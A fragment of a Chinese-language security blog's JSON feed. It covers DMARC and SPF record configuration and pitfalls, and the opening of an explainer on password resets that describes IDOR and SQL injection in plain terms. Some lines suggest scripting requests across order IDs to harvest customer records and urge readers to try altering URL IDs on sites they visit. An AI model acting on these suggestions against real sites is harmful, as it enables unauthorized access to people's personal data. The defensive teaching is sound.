<code>rf=afrf</code></p>\n<p>定義失敗報告的格式，目前只有 <code>afrf</code> 一種，同樣是預設值。</p>\n<h5 id=\"ri\"><a class=\"direct-link\" href=\"#ri\">#</a> ri</h5>\n<p>語法為： <code>ri=sec</code></p>\n<p>收到彙整報告的區間，單位為秒，預設是 86400，也就是一天。你也可以設定每幾小時接收報告，不過為了避免造成收信方太大負擔，小於一天的報告區間採 best effort 寄送（白話文：我盡量啦）。</p>\n<h3 id=\"%E5%A4%9A%E5%80%8B%E5%AD%90%E7%B6%B2%E5%9F%9F-2\"><a class=\"direct-link\" href=\"#%E5%A4%9A%E5%80%8B%E5%AD%90%E7%B6%B2%E5%9F%9F-2\">#</a> 多個子網域</h3>\n<p>如果你有多個會寄信的網域，其實不需要為他們分別設置 DMARC 紀錄。我們上面提過的 <code>sp</code> 標籤就是為了讓你可以在根網域的 DMARC 紀錄指示子網域的 policy。</p>\n<h3 id=\"%E7%AC%AC%E4%B8%89%E6%96%B9%E6%9C%8D%E5%8B%99-2\"><a class=\"direct-link\" href=\"#%E7%AC%AC%E4%B8%89%E6%96%B9%E6%9C%8D%E5%8B%99-2\">#</a> 第三方服務</h3>\n<p>如果你在 SPF 跟 DKIM 有設好，第三方服務對 DMARC 的影響會在 alignment 的部分。我們說過， <code>smtp.MailFrom</code> 跟 <code>header.From</code> 可以不同，所以如果你透過 Sendgrid 等服務寄信，SPF 驗證會通過但是 alignment 就會失敗。不過好在 alignment 檢查只要 SPF 或 DKIM 通過就行了，所以回到前面介紹 DKIM 與第三方服務的部分，這裡用的是我們自己的 <code>d=</code> 網域，所以 alignment 就沒問題了。</p>\n<p>另一種會出事的場景是轉發（forwarding），也就是有一個中繼 email server 要在不影響 authentication 的情況下傳遞原汁原味的信件。因為多了一個中間人，所以 SPF 會驗證失敗，而 DKIM 雖然會驗證成功，但在 alignment 檢查又會被擋下。這種多 hop 傳遞的情況在現實世界中是很常見的，但是 DMARC 的機制會使這些信件驗證失敗，因此延伸出了我們下一篇會再來聊聊的 ARC （Authentication Recieved Chain）機制。</p>\n<hr>\n<h2 id=\"%E7%B5%90%E8%AB%96\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AB%96\">#</a> 結論</h2>\n<p>終於整理完繁瑣的各種細節了（撒花！）這兩篇基本上把 RFC 定義翻譯了一遍，不過因為這些機制都還不算太成熟，所以設定未來都還是可能變動的。</p>\n<p>我自己在設定這些的時候是配合著原始信件內容跟彙整報告檢視三劍客的有效性跟正確性，建議大家可以測試的時候可以多寄到幾個不同的信箱（例如 gmail、outlook、hotmail、yahoo …）看看 action 的不同。如果要偽冒寄信的話可以用線上的 Emkei’s Fake Mailer 來檢視信件是否真的有被擋下來。</p>\n<p>不過，即使是驗證全都 pass 的信件還是有可能進垃圾信或是被擋下的喔！因為 DMARC 只是 MDA 參考的其中一個 filter，其他因素，例如內容重複性太高或是有奇怪連結、圖片、檔案等等也是會導致信件被過濾的。畢竟可是有很多 email security 廠商在努力幫大家擋掉釣魚跟垃圾信呢 XDDD</p>\n<p>關於 SPF、DKIM、DMARC 的原理與設置大致就到這，下一篇我們會來探討這些機制的不足、延伸的問題、和更多 email security 的小知識！</p>\n<h3 id=\"reference%3A\"><a class=\"direct-link\" href=\"#reference%3A\">#</a> Reference:</h3>\n<ol>\n<li><a href=\"https://datatracker.ietf.org/doc/html/rfc7208\">SPF RFC</a></li>\n<li><a href=\"https://datatracker.ietf.org/doc/html/rfc6376\">DKIM RFC</a></li>\n<li><a href=\"https://datatracker.ietf.org/doc/html/rfc7489\">DMARC RFC</a></li>\n</ol>\n",
      "date_published": "2021-07-15T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/crystal/email-sec-settings-spf/",
      "url": "https://tech-blog.cymetrics.io/posts/crystal/email-sec-settings-spf/",
      "title": "關於 email security 的大小事 — 設定篇 SPF",
      "content_html": "<!-- summary -->\n<p>上一次我們深入瞭解了 email security 的原理與應用場景，這次來看看 SPF、DKIM、DMARC 該如何設置吧！</p>\n<!-- summary -->\n<p>請注意，這裡的『設定』並不是回答你『如何在 google 或是 Office365 設好這些紀錄』、『用 XX 服務結果信寄不到怎麼辦』，這種操作配置的教學文請參考官方文件，畢竟 email provider 千千百百家，各自可能有的問題更是難以彙整。</p>\n<p>我想告訴你的『設定』是 SPF、DMARC 的 DNS 紀錄本身有哪些標籤，以及設置這些選項時可能不小心踩到哪些地雷，導致收信方的 email server 在驗證你的郵件時出現非預期地報錯，而判斷驗證失敗。另外，也會告訴你如果有多個子網域，或有使用第三方寄信服務時該怎麼辦。</p>\n<p>總之，可以想成是回答你『我該怎麼理解這些紀錄』和『每個機制有哪些選項跟限制』，而不是針對單一 email provider 的教學文。</p>\n<p>如果你還不太懂 SPF、DKIM、DMARC 是什麼，或是不清楚郵件傳遞過程中的各個角色與職責（MDA、MTA⋯⋯們），或是想了解更多範例與延伸議題，請看本系列其他篇：</p>\n<p>有不懂或是想了解更多範例與延伸議題，請看本系列其他篇～<br>\n如果你還不太懂 SPF、DKIM、DMARC 👉 <a href=\"https://tech-blog.cymetrics.io/posts/crystal/email-sec-theory\">關於 email security 的大小事 — 原理篇</a><br>\n如果你在找 DKIM、DMARC 的設定 👉 <a href=\"https://tech-blog.cymetrics.io/posts/crystal/email-sec-settings-dkimdmarc\">關於 email security 的大小事 — 設定篇 DKIM、DMARC</a><br>\n如果你想搭配設定範例 👉 <a href=\"https://tech-blog.cymetrics.io/posts/crystal/email-sec-examples\">關於 email security 的大小事 — 範例篇</a><br>\n如果你想了解延伸議題 👉 <a href=\"https://tech-blog.cymetrics.io/posts/crystal/email-sec-extra\">關於 email security 的大小事 — 延伸篇</a></p>\n<h2 id=\"spf\"><a class=\"direct-link\" href=\"#spf\">#</a> SPF</h2>\n<p>先來看看 SPF。SPF 紀錄的語法說複雜不複雜，但各種小細節常常讓人頭疼，一個很完整的語法介紹可以參考 <a href=\"https://dmarcian.com/spf-syntax-table\">Dmarcian-SPF record syntax</a>。</p>\n<p>如果想配著真實的信件看，建議你可以用 <a href=\"https://mxtoolbox.com/SuperTool.aspx\">mxtoolbox</a> 之類的工具一邊查詢 SPF 紀錄，一邊點開信件原始內容看 SPF 驗證結果：</p>\n<p><img src=\"/img/posts/crystal/email-sec-settings-spf/spf-result.png\" alt=\"\"></p>\n<p>這裡我們先講一下 SPF 驗證時會出現的幾種結果：</p>\n<ul>\n<li><code>Pass</code>：IP 於列表中，驗證成功。採取行為是：accept</li>\n<li><code>Fail</code>：IP 不在列表中，驗證失敗。採取行為是：reject</li>\n<li><code>SoftFail</code>：IP 不在列表中，驗證失敗，但不要直接 reject。採取行為是：accept but mark（標注失敗）</li>\n<li><code>Neutral</code>：不予置評，即使 IP 不在列表中也不視為失敗，視同 <code>None</code>。採取行為是：accept</li>\n<li><code>None</code>：沒有足夠資訊得出結論（例如未找到 SPF 紀錄）。採取行為是：accept</li>\n<li><code>PermError</code>：驗證過程出錯，例如格式錯誤的 SPF 紀錄。採取行為是：unspecified（未定義），交由收信方 email server 自行決定。</li>\n<li><code>TempError</code>：驗證過程出錯，但沒有 PermError 嚴重。採取行為可能是 accept 或暫時 reject，由收信方 email server 自行決定。</li>\n</ul>\n<p>SPF 的小地雷就在於，很多種設置上的小失誤可能導致 PermError、TempError、或是其他削弱 SPF 安全性的結果。因為我們無法預期收信方 email server 會採取什麼行為，所以也無法確保送到收件人手上的信件都有受到 SPF 紀錄的保護。要是對方遇到 Error 一律採取 accept，或是乾脆選擇忽略這筆 SPF 紀錄，那不就形同虛設了嗎？</p>\n<p>下面我們看看 SPF 紀錄中的標籤： 8 個機制（mechanism）跟 2 種修飾（modifier），以及他們可能踩到地雷的情形。所有的標籤（tag）與標籤值（tag value）中間都不能有空白。此外，至少在出現更新版本的 SPF spec之前，現階段 SPF 紀錄開頭必須是 <code>v=spf1</code>。</p>\n<p><img src=\"/img/posts/crystal/email-sec-theory/spf.png\" alt=\"\"></p>\n<p>以下我們稱信件的來源（也就是 <code>smtp.MailFrom</code>）為 sender-domain 或 sender-ip，標籤值為 target-domain 或 target-ip。</p>\n<h3 id=\"mechanisms\"><a class=\"direct-link\" href=\"#mechanisms\">#</a> Mechanisms</h3>\n<p>8 個 mechanism 為： <code>all, ip4, ip6, a, mx, ptr, exists, include</code></p>\n<p>SPF 紀錄驗證時是照著 mechanism 出現的順序比對的，比對結果為 match、 not-match、或 error 之一，一旦成功找到 match 或是發生 error 就會停下。</p>\n<p>在每個 mechanism 前都可能帶有一個 qualifier 符號，為下列其一：</p>\n<ul>\n<li><code>pass(+)</code>：若對到 sender-ip，結果 pass（即白名單）。預設值，可以省略（ <code>+all</code> 同 <code>all</code>）</li>\n<li><code>neutral(?)</code>：None ，等同沒有 policy。</li>\n<li><code>softfail(~)</code>：若對到 sender-ip，結果 fail，仍要標注並接受。</li>\n<li><code>fail(-)</code>：若對到 sender-ip，結果 fail（即黑名單）。</li>\n</ul>\n<h5 id=\"all\"><a class=\"direct-link\" href=\"#all\">#</a> all</h5>\n<p>語法為： <code>[qualifier]all</code></p>\n<p>必須在紀錄最末，是最後一個判斷條件。一般來說應設置最嚴謹的 <code>-all</code>，表示除了前述 mechanism 指定的 target IP 外一律拒絕（<code>fail(-)</code>），所以如果前面的 mechanism 都沒對到，最後就會失敗。</p>\n<p>地雷：</p>\n<ul>\n<li>缺少 <code>all</code>：<code>PermError</code></li>\n<li><code>all</code> 後面的任何標籤均會被忽略</li>\n<li><code>?all, +all</code>：不管前面有沒有對到，都視為 pass。SPF 跟沒設一樣。</li>\n</ul>\n<h5 id=\"ip4%2C-ip6\"><a class=\"direct-link\" href=\"#ip4%2C-ip6\">#</a> ip4, ip6</h5>\n<p>語法為：<code>[qualifier]ip4:target-ip[cidr-length]</code> 或 <code>[qualifier]ip6:target-ip[cidr-length]</code></p>\n<p>分別用 ipv4 與 ipv6 定義的 IP 列表，只要是 CIDR 表示法都可以，例如 <code>192.168.0.1/16</code>。斜線後的 prefix length 如果省略，會預設為 <code>/32</code>（ipv4）與 <code>/128</code>（ipv6）。</p>\n<p>地雷：</p>\n<ul>\n<li>不合法的 IP：<code>PermError</code></li>\n</ul>\n<h5 id=\"a\"><a class=\"direct-link\" href=\"#a\">#</a> a</h5>\n<p>語法為：<code>[qualifier]a:[target-domain][cidr-length]</code></p>\n<p>檢查 sender IP 是否在 target-domain 的 A 或 AAAA 紀錄中，即是否為 target-domain 所擁有的 IP。如果沒有寫 target-domain 就會默認為當前 SPF 紀錄的網域， <code>a</code> 等同 <code>a:sender-domain</code>。</p>\n<h5 id=\"mx\"><a class=\"direct-link\" href=\"#mx\">#</a> mx</h5>\n<p>語法為：<code>[qualifier]mx:[target-domain][cidr-length]</code></p>\n<p>檢查 sender IP 是否在 target-domain 的 MX 紀錄中。如果沒有寫 target-domain 就會默認為當前 SPF 紀錄的網域， <code>mx</code> 等同 <code>mx:sender-domain</code>。</p>\n<p>地雷：</p>\n<ul>\n<li>若一個 MX 紀錄包含超過 10 個 A 或 AAAA 紀錄：<code>PermError</code></li>\n</ul>\n<h5 id=\"ptr-%EF%BC%88%E5%B7%B2%E5%BB%A2%E6%A3%84%EF%BC%89\"><a class=\"direct-link\" href=\"#ptr-%EF%BC%88%E5%B7%B2%E5%BB%A2%E6%A3%84%EF%BC%89\">#</a> ptr （已廢棄）</h5>\n<p>語法為：<code>[qualifier]ptr:[target-domain]</code></p>\n<p>進行 reverse DNS lookup，若得到的網域是 <code>smtp.MailFrom</code> 或其子網域，則 pass。此機制速度慢且會 .arpa name servers 的負擔，請勿使用。</p>\n<p>地雷：</p>\n<ul>\n<li>若一個 PTR 紀錄包含超過 10 個 A 或 AAAA 紀錄，只看前十個後面忽略</li>\n</ul>\n<h5 id=\"exists\"><a class=\"direct-link\" href=\"#exists\">#</a> exists</h5>\n<p>語法為：<code>[qualifier]exists:target-domain</code></p>\n<p>若 target-domain 存在 A 紀錄，視為 pass。</p>\n<h5 id=\"include\"><a class=\"direct-link\" href=\"#include\">#</a> include</h5>\n<p>語法為：<code>[qualifier]include:target-domain</code></p>\n<p>跟寫程式呼叫另一個函數的概念類似，會檢查 target-domain 的 SPF 紀錄並且一直遞迴查詢下去，直到比對過每一個 IP。但 include 不代表把對方的 SPF 紀錄 inline 插入自己的，而是跳到對方的 SPF 紀錄的 context 中比對，最後得到 match、 not-match、或 error 的結果。</p>\n<p>在遞迴過程中，子紀錄的驗證結果對母紀錄的 include 機制的影響為：</p>\n<ul>\n<li><code>Pass</code>→ include 判定：match</li>\n<li><code>Fail, Softfail, Neutral</code>→ include 判定：not-match</li>\n<li><code>PermError, None</code>→ include 判定：<code>PermError</code></li>\n<li><code>TempError</code>→ include 判定：<code>TempError</code></li>\n</ul>\n<p>include 機制適合用在核准外部（跨域）的 email provider，例如當我們使用第三方寄件服務時，就要把對方的 SPF 紀錄用 include 機制放到我們的SPF 紀錄。</p>\n<h3 id=\"modifiers\"><a class=\"direct-link\" href=\"#modifiers\">#</a> Modifiers</h3>\n<p>2 種修飾為： <code>redirect, exp</code></p>\n<h5 id=\"redirect\"><a class=\"direct-link\" href=\"#redirect\">#</a> redirect</h5>\n<p>語法為：<code>redirect:target-domain</code></p>\n<p>必須在紀錄最末，與 all 不可同時出現。若前面的 mechanism 驗證完畢但都沒有找到 match，就用 target-domain 的 SPF 紀錄取代自己的。與 include 的母子關係不同，這裡用 inline 概念插入，所以任何報錯視為當前 SPF 紀錄的 Error。</p>\n<p>地雷：</p>\n<ul>\n<li>若 target-domain 沒有 SPF 紀錄：<code>PermError</code></li>\n<li><code>all</code> 與 <code>redirect</code> 只能出現一個，若紀錄中兩者同時出現則 <code>redirect</code> 會被忽略</li>\n</ul>\n<h5 id=\"exp\"><a class=\"direct-link\" href=\"#exp\">#</a> exp</h5>\n<p>語法為：<code>exp:target-domain</code></p>\n<p>代表 explanation，若 SPF 紀錄驗證結果為 <code>Fail</code>，會返回 target-domain 的 TXT 紀錄內的字串。</p>\n<p>地雷：</p>\n<ul>\n<li>若在 include 的 target-domain 的 SPF 紀錄中找到 exp，會忽略（母子關係）；若在 redirect 的 target-domain 的 SPF 紀錄中找到 exp，則會忽略原紀錄的 exp（取代關係）</li>\n</ul>\n<h3 id=\"%E5%85%B6%E4%BB%96%E5%9C%B0%E9%9B%B7%EF%BC%9A\"><a class=\"direct-link\" href=\"#%E5%85%B6%E4%BB%96%E5%9C%B0%E9%9B%B7%EF%BC%9A\">#</a> 其他地雷：</h3>\n<ul>\n<li>DNS 回傳 NXDOMAIN（沒有 <code>smtp.MailFrom</code> 這個網域）：<code>None</code></li>\n<li>找到複數筆 SPF 紀錄：<code>PermError</code></li>\n<li>SPF 紀錄開頭不是 <code>v=spf1</code>：<code>None</code></li>\n<li>SPF 紀錄被設成 SPF 類型而不是 TXT 類型：SPF 類型作為 SPF 機制發展的過渡期使用，目前已廢棄，處理方式未定義</li>\n<li>任何語法錯誤，例如 mechanism 或 modifier 拼錯字，或是中間多了空格等：<code>PermError</code></li>\n<li>DNS 查詢 timeout 、server failure 等除了 success 與 nxdomain 的結果：<code>TempError</code></li>\n<li>發生大於兩次 void lookup，也就是 DNS query 回傳空白結果（success 與 nxdomain）：<code>PermError</code></li>\n<li>涵括除了 <code>all, ip4, ip6, exp</code>之外的所有標籤，以及往下遞迴時需要的 DNS query，總計超過 10 次 DNS lookup：<code>PermError</code></li>\n<li>若 redirect 或 include 的網域有重複（例如 SPF 紀錄有：<code>include: a.com include:b.com</code> 但是 <a href=\"http://a.com\">a.com</a> 的 SPF 紀錄內已經有 <code>include:b.com</code>）或是 loop（a include b → b include c → c include a）的情況，不會報錯，但很可能會導致超過 10 次 DNS lookup</li>\n<li>若驗證一筆 SPF 紀錄需要超過 20 秒：<code>TempError</code></li>\n<li>每個 modifier 在 SPF 紀錄只能各出現一次，若超過：<code>PermError</code></li>\n</ul>\n<h3 id=\"%E5%A4%9A%E5%80%8B%E5%AD%90%E7%B6%B2%E5%9F%9F\"><a class=\"direct-link\" href=\"#%E5%A4%9A%E5%80%8B%E5%AD%90%E7%B6%B2%E5%9F%9F\">#</a> 多個子網域</h3>\n<p>如果你有多個會寄信的網域，就要為每一個分別設置 SPF 紀錄。如果它們是從同一個 email server 寄出去的，可以用 redirect 統一指向一筆紀錄，方便管理。</p>\n<p>不寄信的網域（parked domain）請設置 <code>v=spf1 -all</code>。</p>\n<h3 id=\"%E7%AC%AC%E4%B8%89%E6%96%B9%E6%9C%8D%E5%8B%99\"><a class=\"direct-link\" href=\"#%E7%AC%AC%E4%B8%89%E6%96%B9%E6%9C%8D%E5%8B%99\">#</a> 第三方服務</h3>\n<p>如果你有使用第三方的寄件服務，例如 SendGrid，你可以在 SPF 紀錄中用 include 機制把第三方的 email server 涵蓋進來，例如 OneDegree 使用微軟 Outlook、MailChimp、FreshDesk、SendGrid 等服務：</p>\n<p>v=spf1 include:spf.protection.outlook.com include:servers.mcsv.net include:email.freshdesk.com -all</p>\n<p>眼尖的人可能會發現，上面的紀錄怎麼少了 <code>include:sendgrid.net</code>？</p>\n<p>其實，你如果去查這幾個第三方服務的的 SPF 紀錄就會發現，FreshDesk 的 SPF 紀錄就已經有 <code>include:sendgrid.net</code> 這一行，因此我們就不用加啦！這樣也可以省下一筆 DNS lookup 的扣打，畢竟 10 次 DNS lookup 是很容易超過的。</p>\n<p>這裡也順便回答一個非常常見的問題：</p>\n<blockquote>\n<p>『超過 10 次 DNS lookup 怎麼辦』</p>\n</blockquote>\n<p>只要你多用幾個第三方寄件服務，馬上就超過 10 次了，畢竟你 include 他算一次，他用到的 include、a、mx 等等也通通算你的！還不含你自己的一些 email server 呢！</p>\n<p>解決這個問題有幾個撇步：</p>\n<p>如果你有 lookup 到你自己的一些 email server，可以考慮用 ip4 ip6 直接 inline 插進來，例如：</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">// before  <br>mydom.com -> include:sub1.mydom.com mx:sub2.mydom.com include:a.com  <br>sub1.mydom.com(SPF) -> ip4:192.x.x.3 ip4:172.x.x.x/16  <br>sub2.mydom.com(MX) -> 192.x.126.5<br><br>//after  <br>mydom.com -> ip4:192.x.x.3 ip4:172.x.x.x/16 ip4:192.x.126.5 include:a.com</code></pre>\n<p>或者，可以考慮把這個寄信的 domain 拆成幾個不同功用的 subdomain 然後把第三方寄件服務也依據用途瓜分下去，這樣每個 domain 都有自己的 10 次扣打。例如：</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">// before  <br>mydomain.com -> include:a.com include:b.com include:c.com <br><br>//after  <br>mydomain.com -> include:a.com   <br>customer.mydomain.com -> include:b.com   <br>partnership.mydomain.com -> include:c.com</code></pre>\n<p>如果你很不幸地用到了一個第三方服務，他自己的 SPF 紀錄就要用到快 10 次 lookup，那只能說….換一個吧？（或是聯繫對方看看他們有什麼建議啦）</p>\n<h2 id=\"%E7%B5%90%E8%AB%96\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AB%96\">#</a> 結論</h2>\n<p>恭喜大家搞懂三劍客裡最難設定的 SPF 啦！你可以在網路上找到的 SPF 紀錄檢查器通常不會把我們討論的地雷全都檢查一次，因為實在是太麻煩啦QQ 推薦你可以多用幾種工具配著這篇仔細檢視一下你的 SPF 紀錄，然後跟著下一篇設好 DMARC 後，就可以在每日的彙整報告中看到 SPF 通過跟失敗的紀錄囉！</p>\n<h3 id=\"reference%3A\"><a class=\"direct-link\" href=\"#reference%3A\">#</a> Reference:</h3>\n<ol>\n<li><a href=\"https://datatracker.ietf.org/doc/html/rfc7208\">SPF RFC</a></li>\n<li><a href=\"https://datatracker.ietf.org/doc/html/rfc6376\">DKIM RFC</a></li>\n<li><a href=\"https://datatracker.ietf.org/doc/html/rfc7489\">DMARC RFC</a></li>\n</ol>\n",
      "date_published": "2021-07-14T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/huli/why-only-reset-password-not-retrieve-password/",
      "url": "https://tech-blog.cymetrics.io/posts/huli/why-only-reset-password-not-retrieve-password/",
      "title": "為什麼忘記密碼時只能重設，不把舊密碼告訴我？",
      "content_html": "<p>某天小明在整理他的我的最愛（到底誰的），發現了一個以前很常逛，但已經將近半年多沒去的一個論壇。小明想回去看看那邊變得怎麼樣了，於是點進去那個論壇，輸入了帳號密碼，得到了密碼錯誤的回覆。</p>\n<p>嘗試了幾次之後，系統提示小明可以使用「忘記密碼」的功能，所以小明填了自己的 email 之後去信箱收信，發現系統傳來一個「重設密碼」的連結。雖然說最後小明成功利用重新設定的密碼登入，但有個問題讓他百思不得其解：</p>\n<blockquote>\n<p>「奇怪欸，幹嘛要我重設密碼，為什麼不把舊的密碼寄給我就好？」</p>\n</blockquote>\n<!-- summary -->\n<p>應該有許多人都跟小明一樣，有過類似的疑惑。把舊密碼寄給我不是很好嗎，幹嘛強迫我換密碼？</p>\n<p>這一個看似簡單的問題，背後其實藏了許多資訊安全相關的概念，就讓我們慢慢尋找問題的答案，順便學習一些基本的資安知識吧！</p>\n<!-- summary -->\n<p>先提醒一下，雖然說前半段看起來可能跟文章主題無關，但好酒沉甕底，我保證最後會把這些東西關聯起來。</p>\n<h2 id=\"%E8%A2%AB%E5%81%B7%E8%B5%B0%E7%9A%84%E8%B3%87%E6%96%99%E5%BA%AB\"><a class=\"direct-link\" href=\"#%E8%A2%AB%E5%81%B7%E8%B5%B0%E7%9A%84%E8%B3%87%E6%96%99%E5%BA%AB\">#</a> 被偷走的資料庫</h2>\n<p>大家應該很常看到新聞說哪個網站的資料又被偷走了，顧客個資全部都外洩出去。例如說<a href=\"https://tw.news.yahoo.com/%E5%80%8B%E8%B3%87%E9%81%AD%E6%B4%A9-%E9%BA%A5%E7%95%B6%E5%8B%9E%E8%81%B2%E6%98%8E-%E4%B8%8D%E5%90%AB%E4%BB%98%E6%AC%BE%E8%B3%87%E6%96%99-103012207.html\">麥當勞</a>在近期就發生了類似的事件：</p>\n<p><img src=\"/img/posts/huli/reset-password/p1.png\" alt=\"麥當勞資料外洩的通知信\"></p>\n<p>這邊我想帶大家探討的兩個問題是：</p>\n<ol>\n<li>資料真的這麼容易外洩嗎？</li>\n<li>資料外洩之後，可能造成什麼後果？</li>\n</ol>\n<p>我們先來看第一個問題，有很多安全性的漏洞可以造成資料外洩，而有些漏洞的攻擊方式，比你想的還簡單一百倍。</p>\n<p><img src=\"/img/posts/huli/reset-password/p2.jpeg\" alt=\"Photo by Arget on Unsplash\"></p>\n<p>你想像中的駭客可能像上面那樣，打著一大堆不知道在幹嘛的指令，畫面上出現很多黑底白字或是綠字的畫面，完全搞不懂在幹嘛，但是做著做著網站就被打下來了。</p>\n<p>而事實上有些漏洞，可能在網址列上面改幾個字就攻擊成功了，就算你不懂任何程式也做得到。</p>\n<p>舉例來說好了，假設今天有個購物網站，你買了一些東西之後送出訂單，訂單成立後跳轉到訂單頁面，上面有著一大堆你的個資，例如說：姓名、收貨地址、聯絡電話以及 Email 等等。</p>\n<p>然後你發現訂單頁面的網址是 <a href=\"https://shop.huli.tw/orders?id=14597\">https://shop.huli.tw/orders?id=14597</a></p>\n<p>而正好你的訂單編號也是 14597，在好奇心的驅使之下，你就試著把數字改成 14596，然後按下 Enter。</p>\n<p>當網站載入完成之後，你竟然還真的能看到編號為 14596 的訂單，上面出現一個你不認識的人的姓名、收貨地址、聯絡電話跟 Email。</p>\n<p>有些攻擊就是這麼樸實無華且枯燥，只要改個字就能看到屬於其他人的資料。這時候如果你會寫程式的話，就可以寫個腳本自動去抓 id 是 1 一直到 id 是 15000 的資料，你就拿到了這個購物網站 15000 筆訂單的資訊，也就是一萬多個顧客的個資。</p>\n<p>這過程中沒有什麼黑底白字的畫面，也不用一直瘋狂打字，唯一需要的只有改數字，個資就輕鬆到手。</p>\n<p>這類型的漏洞有個專有名詞，稱為 IDOR，全名是：Insecure direct object references，大約就是不安全的直接資料存取的意思。漏洞產生的原因就是工程師在開發時，並沒有注意到權限控管，因此讓使用者能存取到其他人的資料。</p>\n<p>有些人看到這邊可能以為我只是為了文章淺顯易懂，所以才舉一個簡化的例子，現實生活中的攻擊才沒這麼簡單。</p>\n<p>這句話算是對了一半，大部分的網站確實都不會有這麼明顯的一個漏洞，攻擊方式會更複雜一點。但可怕的是，還真的有些網站就是這麼簡單，就是改個數字就可以拿到別人的資料。</p>\n<p>台灣有一個網站叫做 <a href=\"https://zeroday.hitcon.org/\">HITCON ZeroDay</a>，是由台灣駭客協會所維護的漏洞回報平台。有些人發現漏洞之後可能會竊取個資拿去賣，從事非法行為，也有些人發現漏洞只是為了鍛鍊技術，並沒有想要做什麼壞事。</p>\n<p>因此就可以透過這個平台進行回報，回報漏洞之後負責維護平台的志工們會幫你驗證漏洞，驗證過後回報給負責的廠商，讓他們去修復漏洞。</p>\n<p>這個平台上的漏洞在修復過後隔一陣子會公開，或者儘管廠商沒有回報修復，過一陣子（例如說兩個月）後也會公開，因此在這平台上可以找到許多公開的漏洞，看過之後你大概就不會想在網站註冊時留下真實個資了…</p>\n<p>例如說這兩個就是 IDOR 的真實漏洞：</p>\n<ol>\n<li><a href=\"https://zeroday.hitcon.org/vulnerability/ZD-2021-00206\">享健身xarefit 任意訪問/下載所有會員個資</a></li>\n<li><a href=\"https://zeroday.hitcon.org/vulnerability/ZD-2021-00260\">DoorGods 防疫門神實聯制系統IDOR導致個資外洩</a></li>\n</ol>\n<p>對，不要懷疑，就真的只是在網址上改個數字而已這麼容易。</p>\n<p>以後只要看到網址列上有這種數字，就可以試著去改改看，搞不好不會寫程式的你也可以發現 IDOR 的漏洞。</p>\n<p>除了這種只要改個東西的漏洞之外，還有另外一個很常見但是需要一點技術能力才能攻破的漏洞，叫做 SQL Injection。</p>\n<p>先來講講 SQL 是什麼，簡單來說就是跟資料庫查詢東西的一種程式語言。既然說是語言那就會有固定語法，若是以中文舉例，大概就像是：</p>\n<blockquote>\n<p>去找「訂單資料」，給我「id 是 1 的」，按照「建立時間」排序</p>\n</blockquote>\n<p>用「」框起來的部分代表可以變動，而其他關鍵字例如說「去找」、「給我」這些都是固定的，因為語法要固定才能寫程式去解析。</p>\n<p>同樣以上面假想的購物網站為例，如果網址是 <a href=\"https://shop.huli.tw/orders?id=14597%EF%BC%8C%E9%82%A3%E7%B6%B2%E7%AB%99%E5%8E%BB%E8%B7%9F%E8%B3%87%E6%96%99%E5%BA%AB%E6%8B%BF%E8%B3%87%E6%96%99%E6%99%82%EF%BC%8C%E6%8C%87%E4%BB%A4%E5%A4%A7%E6%A6%82%E5%B0%B1%E6%98%AF%EF%BC%9A\">https://shop.huli.tw/orders?id=14597，那網站去跟資料庫拿資料時，指令大概就是：</a></p>\n<blockquote>\n<p>去找「訂單資料」，給我「id 是 14597 的」</p>\n</blockquote>\n<p>因為網址列上的 id 是 14597 嘛，所以這個 id 就會被放到查詢的指令去，如果 id 是別的，那查詢的指令也會不一樣。</p>\n<p>這時候如果我的 id 不是數字，而是「1 的順便給我使用者資料」，查詢就變成：</p>\n<blockquote>\n<p>去找「訂單資料」，給我「id 是 1 的順便給我使用者資料」</p>\n</blockquote>\n<p>那整個網站的使用者資料就順便被我抓下來了。</p>\n<p>這個攻擊之所以叫做 SQL injection，重點就在於那個 injection，攻擊者「注入」了一段文字被當作指令的一部分執行，所以攻擊者就可以執行任意查詢。</p>\n<p>比起上面講的 IDOR，SQL injection 通常會更為致命，因為不只是訂單資料本身，連其他資料也會被一起撈出來。所以除了訂單資料，會員資料跟商品資料都有可能一起外洩。</p>\n<p>這邊也隨便找兩個公開的案例：</p>\n<ol>\n<li><a href=\"https://zeroday.hitcon.org/vulnerability/ZD-2020-00276\">北一女中網站存在SQL Injection漏洞</a></li>\n<li><a href=\"https://zeroday.hitcon.org/vulnerability/ZD-2021-00052\">桃園高中 網站 SQL injection</a></li>\n</ol>\n<p>而防禦方式就是不要把使用者輸入的「1 的順便給我使用者資料」直接當作指令，而是經過一些處理，讓整段查詢變成：「給我 id 是：『1 的順便給我使用者資料』的資料」，那因為沒有這個 id，所以什麼事也不會發生。</p>\n<h2 id=\"%E5%80%8B%E8%B3%87%E6%B4%A9%E6%BC%8F%E4%BA%86%EF%BC%8C%E7%84%B6%E5%BE%8C%E5%91%A2%EF%BC%9F\"><a class=\"direct-link\" href=\"#%E5%80%8B%E8%B3%87%E6%B4%A9%E6%BC%8F%E4%BA%86%EF%BC%8C%E7%84%B6%E5%BE%8C%E5%91%A2%EF%BC%9F\">#</a> 個資洩漏了，然後呢？</h2>\n<p>前面我們已經看到了針對那些沒有做好防禦的網站，個資外洩是多麽容易的一件事情。</p>\n<p>那個資洩漏之後，對使用者會有什麼影響呢？</p>\n<p>大家最感同身受的應該就是詐騙電話吧，例如說某些買書的網站或是訂房網站，打過來跟你說什麼要分期退款，為了博取你的信任，連你買了哪本書，訂了哪個房間，或是你家地址跟姓名全都講得出來。</p>\n<p>這些都是因為資料外洩的緣故，詐騙集團才會知道的這麼清楚。</p>\n<p>但除了這些個資以外，還有兩個東西也會外洩，那就是你的帳號跟密碼。</p>\n<p>也許你會想說：「不就帳號跟密碼嗎，我就在那個網站上面改密碼以後再用就好啦！」</p>\n<p>事情也許沒有你想的這麼簡單。如果你沒有用密碼管理軟體的話，我大膽猜測你所有的密碼可能都是同一組。因為怕記不起來嘛，所以乾脆都用同一組密碼。</p>\n<p>這時候如果帳密外洩，駭客是不是就可以拿這組帳密去其他服務試試看？</p>\n<p>拿去登你的 Google，登你的 Facebook，這時候用同一組密碼的人就會被登進去。所以從表面看只是一個購物網站被入侵，但造成的結果卻是你的 Google 還有 Facebook 